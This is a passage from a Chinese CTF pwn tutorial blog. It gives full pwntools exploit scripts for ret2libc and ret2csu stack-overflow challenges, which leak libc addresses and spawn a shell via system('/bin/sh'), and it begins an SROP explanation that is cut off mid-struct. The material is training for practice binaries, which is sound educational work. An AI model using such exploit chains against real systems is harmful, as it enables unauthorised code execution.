<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 平衡</span></span><br><span class="line">pop_rbp_addr = <span class="number">0x400550</span></span><br><span class="line"><span class="comment"># 第一个参数</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x4006B3</span></span><br><span class="line"><span class="comment"># 第二个参数</span></span><br><span class="line">pop_rsi_r15_addr = <span class="number">0x4006B1</span></span><br></pre></td></tr></table></figure>
<p>write需要三个参数，第一个是写入位置，第二个是写入的内容，第三个是写入的数量，我们这里只能拿到前两个参数的gadget，遇到这种情况只能试试了，有些时候他这个寄存器中可能本身就存在值，我们不需要设置也可以用，在read函数中我们触发栈溢出的时候，应该是有值的<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250409165746.png"><br>这里edx是200h，我估计会使用这个，因为栈溢出之后也没有清除他，好我们继续，第一个和第二个参数设置好之后我们需要直接运行write，直接使用got的地址即可，然后输出了之后我们还需要让他继续运行，具体方法就是直接让其运行main函数，让我们可以继续去栈溢出，第一个payload就构造好了具体如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">efl = ELF(<span class="string">&quot;./level3_x64&quot;</span>)</span><br><span class="line"><span class="comment"># 平衡</span></span><br><span class="line">pop_rbp_addr = <span class="number">0x400550</span></span><br><span class="line"><span class="comment"># 第一个参数</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x4006B3</span></span><br><span class="line"><span class="comment"># 第二个参数</span></span><br><span class="line">pop_rsi_r15_addr = <span class="number">0x4006B1</span></span><br><span class="line"><span class="comment"># main</span></span><br><span class="line">main_addr = <span class="number">0x40061A</span></span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">b&quot;a&quot;</span> * <span class="number">136</span>,</span><br><span class="line">        p64(pop_rdi_addr),</span><br><span class="line">        p64(<span class="number">1</span>),</span><br><span class="line">        p64(pop_rsi_r15_addr),</span><br><span class="line">        p64(elf.got[<span class="string">&quot;write&quot;</span>]),</span><br><span class="line">        p64(<span class="number">0</span>),</span><br><span class="line">        p64(elf.plt[<span class="string">&quot;write&quot;</span>]),</span><br><span class="line">        p64(pop_rbp_addr),</span><br><span class="line">        p64(<span class="number">0</span>),</span><br><span class="line">        p64(elf.symbols[<span class="string">&quot;main&quot;</span>]),</span><br><span class="line">    ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>溢出位数这里不多说，可以直接在ida或者动调去看。这个payload会让程序输出write函数在执行的实际地址，然后继续运行<code>main</code>函数。我们通过下面函数去读取回显，程序会写入两次内容，我们一次性接收给他截断，并且补0(-6是因为第一次数据我们没有结束他会输出一个<code>Input:\n</code>)</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br></pre></td></tr></table></figure>
<p>返回的write地址我们通过libcsearch去查询，具体代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>, addr)</span><br><span class="line">offset = addr - libc.dump(<span class="string">&quot;write&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>查询之后我们组装第二个payload，具体就是偏移也查出来了，直接去执行system即可，binsh可以直接从libc中寻找，代码如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">payload = flat(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">b&quot;a&quot;</span> * <span class="number">136</span>,</span><br><span class="line">        p64(pop_rdi_addr),</span><br><span class="line">        p64(libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>) + offset),</span><br><span class="line">        p64(libc.dump(<span class="string">&quot;system&quot;</span>) + offset),</span><br><span class="line">    ]</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<h3 id="攻击脚本-5"><a href="#攻击脚本-5" class="headerlink" title="攻击脚本"></a>攻击脚本</h3><p>完整的攻击脚本如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./level3_x64&quot;</span>)</span><br><span class="line">efl = ELF(<span class="string">&quot;./level3_x64&quot;</span>)</span><br><span class="line"><span class="comment"># 平衡</span></span><br><span class="line">pop_rbp_addr = <span class="number">0x400550</span></span><br><span class="line"><span class="comment"># 第一个参数</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x4006B3</span></span><br><span class="line"><span class="comment"># 第二个参数</span></span><br><span class="line">pop_rsi_r15_addr = <span class="number">0x4006B1</span></span><br><span class="line"><span class="comment"># main</span></span><br><span class="line">main_addr = <span class="number">0x40061A</span></span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">b&quot;a&quot;</span> * <span class="number">136</span>,</span><br><span class="line">        p64(pop_rdi_addr),</span><br><span class="line">        p64(<span class="number">1</span>),</span><br><span class="line">        p64(pop_rsi_r15_addr),</span><br><span class="line">        p64(elf.got[<span class="string">&quot;write&quot;</span>]),</span><br><span class="line">        p64(<span class="number">0</span>),</span><br><span class="line">        p64(elf.plt[<span class="string">&quot;write&quot;</span>]),</span><br><span class="line">        p64(pop_rbp_addr),</span><br><span class="line">        p64(<span class="number">0</span>),</span><br><span class="line">        p64(elf.symbols[<span class="string">&quot;main&quot;</span>]),</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">addr = u64(io.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>, addr)</span><br><span class="line">offset = addr - libc.dump(<span class="string">&quot;write&quot;</span>)</span><br><span class="line">payload = flat(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">b&quot;a&quot;</span> * <span class="number">136</span>,</span><br><span class="line">        p64(pop_rdi_addr),</span><br><span class="line">        p64(libc.dump(<span class="string">&quot;str_bin_sh&quot;</span>) + offset),</span><br><span class="line">        p64(libc.dump(<span class="string">&quot;system&quot;</span>) + offset),</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>然后再附上一个题目给libc的脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># from LibcSearcher import LibcSearcher</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&quot;./level3_x64&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./level3_x64&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.23.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 平衡</span></span><br><span class="line">pop_rbp_addr = <span class="number">0x400550</span></span><br><span class="line"><span class="comment"># 第一个参数</span></span><br><span class="line">pop_rdi_addr = <span class="number">0x4006B3</span></span><br><span class="line"><span class="comment"># 第二个参数</span></span><br><span class="line">pop_rsi_r15_addr = <span class="number">0x4006B1</span></span><br><span class="line"></span><br><span class="line">payload = flat(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">b&quot;a&quot;</span> * <span class="number">136</span>,</span><br><span class="line">        p64(pop_rdi_addr),</span><br><span class="line">        p64(<span class="number">1</span>),</span><br><span class="line">        p64(pop_rsi_r15_addr),</span><br><span class="line">        p64(elf.got[<span class="string">&quot;write&quot;</span>]),</span><br><span class="line">        p64(<span class="number">0</span>),</span><br><span class="line">        p64(elf.plt[<span class="string">&quot;write&quot;</span>]),</span><br><span class="line">        p64(pop_rbp_addr),</span><br><span class="line">        p64(<span class="number">0</span>),</span><br><span class="line">        p64(elf.symbols[<span class="string">&quot;main&quot;</span>]),</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line"><span class="built_in">print</span>(io.recvline())</span><br><span class="line">io.sendline(payload)</span><br><span class="line">addr = u64(io.recvline()[:<span class="number">8</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;============&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(addr)</span><br><span class="line"><span class="built_in">print</span>(libc.symbols[<span class="string">&quot;write&quot;</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;============&quot;</span>)</span><br><span class="line">offset = addr - libc.symbols[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">payload = flat(</span><br><span class="line">    [</span><br><span class="line">        <span class="string">b&quot;a&quot;</span> * <span class="number">136</span>,</span><br><span class="line">        p64(pop_rdi_addr),</span><br><span class="line">        p64(<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>)) + offset),</span><br><span class="line">        p64(libc.symbols[<span class="string">&quot;system&quot;</span>] + offset),</span><br><span class="line">    ]</span><br><span class="line">)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
<p>具体区别就是我这里接收了输出，第二次我只需要截取前8位即可。然后就是偏移，libc直接计算即可。</p>
<h1 id="进阶栈溢出"><a href="#进阶栈溢出" class="headerlink" title="进阶栈溢出"></a>进阶栈溢出</h1><h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><h3 id="漏洞实现"><a href="#漏洞实现" class="headerlink" title="漏洞实现"></a>漏洞实现</h3><p>在64位程序中，只要是引用了libc.so就会有csu相关的代码，有一个<code>__libc_csu_init</code>函数，具体作用是给libc做初始化，他具体执行的内容如下<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250516191757.png"><br>重点在于后面两个框出来的位置，在第一个中它通过r15、r14、r13分别给rdx、rsi、edi进行传参数，相当于控制了一个函数调用的前3个变量，紧接着就直接执行了call，但是call的位置有点说法，他call的是<code>r12+rbx*8</code>位置的函数，我们如果想要利用基本就要把rbx控制为0，让其直接调用r12寄存器中的内容。在第二个函数中它通过栈中的数据给rbx、rbp、r12、r13、r14、r15赋了值，然后最后进行了ret。我们只要造成了栈溢出并且可以做到控制一个执行流，我们就可以通过这个做到任意函数调用，当然调用的前提我们需要算出函数的迁移。具体的攻击流程就是通过loc_400606从栈中拿数据，要重点控制的寄存器是rbx、r12-15，然后再ret的时候ret到loc_4005F0中，这样就可以直接去执行我们构造的call。除函数外，rbx需要重点控制，他最好设置成0，不然call的位置会比较难找。还有就是当前第二个他是通过<code>mov</code>6个基于rsp的偏移位置给寄存器值，最后给rsp+了38h的位置其实这里就可以理解为每一条mov都是在pop，有些版本的这里会直接显示pop，没有<code>add rsp,38h</code>。</p>
<h3 id="题目来源-8"><a href="#题目来源-8" class="headerlink" title="题目来源"></a>题目来源</h3><p>题目下载： <a target="_blank" rel="noopener" href="https://github.com/zhengmin1989/ROP_STEP_BY_STEP/blob/master/linux_x64/level5">https://github.com/zhengmin1989/ROP_STEP_BY_STEP/blob/master/linux_x64/level5</a><br>题目来源： <a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/#_2">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/medium-rop/#_2</a></p>
<h3 id="文件类型-8"><a href="#文件类型-8" class="headerlink" title="文件类型"></a>文件类型</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ┌──(root㉿BoyChaiWindows)-[/mnt/e/TEMP/新建文件夹]</span><br><span class="line">└─# file level5</span><br><span class="line">level5: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.24, BuildID[sha1]=d9f08d31d3b1e53bf52a4206c99f0ad5b61541f6, not stripped</span><br></pre></td></tr></table></figure>
<p>64位，动态链接</p>
<h3 id="软件防护-6"><a href="#软件防护-6" class="headerlink" title="软件防护"></a>软件防护</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(pwn) ┌──(root㉿BoyChaiWindows)-[/mnt/e/TEMP/新建文件夹]</span><br><span class="line">└─# checksec level5</span><br><span class="line">[*] <span class="string">&#x27;/mnt/e/TEMP/新建文件夹/level5&#x27;</span></span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x400000)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
<p>没开pie，没有金丝雀、就开了一个nx，很常规的防护，很显然这就是要用栈溢出进行攻击</p>
<h3 id="IDA分析-8"><a href="#IDA分析-8" class="headerlink" title="IDA分析"></a>IDA分析</h3><p>main函数中的内容如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Hello, World\n&quot;</span>, <span class="number">0xDu</span>LL);</span><br><span class="line">  <span class="keyword">return</span> vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>没什么重点内容，主要是<code>vulnerable_function</code>函数，内容如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0x200u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里就直接是一个栈溢出漏洞，其他的基本没内容，但是在函数列表中找到了<code>__libc_csu_init</code>。然后还在bss中找到了一块可以用的位置<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250516200746.png"></p>
<h3 id="攻击思路-8"><a href="#攻击思路-8" class="headerlink" title="攻击思路"></a>攻击思路</h3><p>这个题目是没有libc的我们需要通过csu构造一个write，输出某个函数的地址，计算偏移，然后继续通过csu构造一个read，写入一个sh，然后再次构造一个csu把binsh写入bss中，最后再次通过csu执行system拿bash。</p>
<h3 id="攻击脚本-6"><a href="#攻击脚本-6" class="headerlink" title="攻击脚本"></a>攻击脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">context.terminal = [<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;start&quot;</span>, <span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, <span class="string">&quot;wsl.exe&quot;</span>, <span class="string">&quot;-e&quot;</span>]</span><br><span class="line">io = process(<span class="string">&quot;./level5&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./level5&quot;</span>)</span><br><span class="line"></span><br><span class="line">rdx_rsi_edi_call = <span class="number">0x4005F0</span></span><br><span class="line"></span><br><span class="line">rbx_rbp_r12_r13_r14_r15_ret = <span class="number">0x400606</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x601028</span></span><br><span class="line"></span><br><span class="line">main_addr = <span class="number">0x400564</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">csu</span>(<span class="params">arg1, arg2, arg3, call</span>):</span><br><span class="line">    payload = flat(</span><br><span class="line">        [</span><br><span class="line">            <span class="string">b&quot;\x00&quot;</span> * <span class="number">136</span>,</span><br><span class="line">            p64(rbx_rbp_r12_r13_r14_r15_ret),</span><br><span class="line">            p64(<span class="number">0</span>),  <span class="comment"># 补38-30</span></span><br><span class="line">            p64(<span class="number">0</span>),  <span class="comment"># rbx 最好是0</span></span><br><span class="line">            p64(<span class="number">1</span>),  <span class="comment"># rbp 下面内容中他必须为1才不会重复的去循环</span></span><br><span class="line">            p64(call),  <span class="comment"># r12 call</span></span><br><span class="line">            p64(arg1),  <span class="comment"># 13  rdi</span></span><br><span class="line">            p64(arg2),  <span class="comment"># r14 rsi</span></span><br><span class="line">            p64(arg3),  <span class="comment"># r15 rdx</span></span><br><span class="line">            p64(rdx_rsi_edi_call),  <span class="comment"># ret</span></span><br><span class="line">            <span class="string">b&quot;\x00&quot;</span> * <span class="number">56</span>,  <span class="comment"># 需要步38H即56</span></span><br><span class="line">            p64(main_addr),</span><br><span class="line">        ]</span><br><span class="line">    )</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;payload:&quot;</span>, payload)</span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Hello, World\n&quot;</span>)</span><br><span class="line"><span class="comment"># 第一次让其返回write的地址，用来计算偏移</span></span><br><span class="line">csu(<span class="number">1</span>, elf.got[<span class="string">&quot;write&quot;</span>], <span class="number">8</span>, elf.got[<span class="string">&quot;write&quot;</span>])</span><br><span class="line">write_addr = u64(io.recv(<span class="number">8</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;write:&quot;</span>, <span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里可以使用libcsearch</span></span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line">offset = write_addr - libc.symbols[<span class="string">&quot;write&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 偏移计算好写入binsh和system地址</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Hello, World\n&quot;</span>)</span><br><span class="line">csu(<span class="number">0</span>, bss_addr, <span class="number">16</span>, elf.got[<span class="string">&quot;read&quot;</span>])</span><br><span class="line">sys_addr = offset + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">io.send(flat([p64(sys_addr), <span class="string">b&quot;/bin/sh\0&quot;</span>]))</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Hello, World\n&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 调用刚才写入的system</span></span><br><span class="line">csu(bss_addr + <span class="number">8</span>, <span class="number">0</span>, <span class="number">0</span>, bss_addr)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><h3 id="漏洞实现-1"><a href="#漏洞实现-1" class="headerlink" title="漏洞实现"></a>漏洞实现</h3><p>SROP的S是指signal机制，触发软中断信号，或者软中断的时候触发。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：<br><img src="https://image.boychai.xyz/article/Pasted%20image%2020250511202230.png"></p>
<ol>
<li>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</li>
<li>内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。需要注意的是，这一部分是在用户进程的地址空间的。之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。<img src="https://image.boychai.xyz/article/Pasted%20image%2020250511202258.png">对于 signal Frame 来说，会因为架构的不同而有所区别，后面会分别给出 x86 以及 x64 的 sigcontext。</li>
<li>signal handler 返回后，内核为执行 sigreturn 系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新 pop 回对应的寄存器，最后恢复进程的执行。其中，32 位的 sigreturn 的调用号为 119(0x77)，64 位的系统调用号为 15(0xf)。</li>
</ol>
<p>上面这个过程是从CTFWIKI中复制的，我是没有完全的读懂，但是说白了，出现signal机制的时候会把寄存器全都压入栈中，这个机制触发之后会从栈中恢复数据到寄存器中，如果在恢复的时候把压入栈的数据给覆盖掉，那么在他触发之后恢复的时候就会直接修改寄存器的内容，这个就很厉害了，寄存器全都能控制，威力很大了。然后x86的压栈和恢复结构如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sigcontext</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> gs, __gsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> fs, __fsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> es, __esh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ds, __dsh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> edi;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esi;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ebp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esp;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ebx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> edx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> ecx;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eax;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> trapno;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> err;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eip;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> cs, __csh;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> eflags;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> esp_at_signal;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">short</span> ss, __ssh;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span> * <span class="title">fpstate</span>;</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> oldmask;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> cr2;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>x64的结构如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">fpstate</span></span></span><br><span class="line"><span 